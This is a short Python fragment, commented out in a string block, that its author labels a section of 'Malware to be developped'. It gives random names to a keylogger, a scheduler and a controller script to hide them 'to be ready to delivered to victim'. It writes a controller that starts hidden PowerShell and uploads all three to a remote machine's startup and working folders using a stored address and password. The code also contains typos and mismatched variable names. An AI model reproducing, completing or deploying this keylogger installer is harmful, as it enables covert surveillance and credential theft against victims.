#section of the Malware to be developped
'''
     #path of files
    controller=f"{local_path}/payloads/controller.cmd"
    Keylogger=f"{local_path}/payloads/keylogger.ps1"
    schedular=f"{local_path}/payloads/scheduler.ps1"

    # obfuscation of the files to be ready to delivered to victim
    obfs_controller=random_text()+".cmd"
    obfs_keylogger=random_text()+".ps1"
    obfs_schedular=random_text()+".ps1"
    # building the controller
    with open(obfs_controller,"w") as f:
        f.write("@echo off")
        f.write(f"powershell Start-Process powershell.exe -windowstyle hidden {working_directory}")

    # file staging
    os.system(f"cp {controller} {local_path}/{obfs_controller}")
    os.system(f"cp {keylogger} {local_path}/{obfs_keylogger}")
    os.system(f"cp {schedular} {local_path}/{obfs_schedularr}")

    # upload the obfscuated keylogger
    remote_uplaod(address,password,obfs_controller,startup_directory)
    remote_uplaod(address,password,obfs_keylogger,working_directory)
    remote_uplaod(address,password,obfs_schedular,working_directory)



'''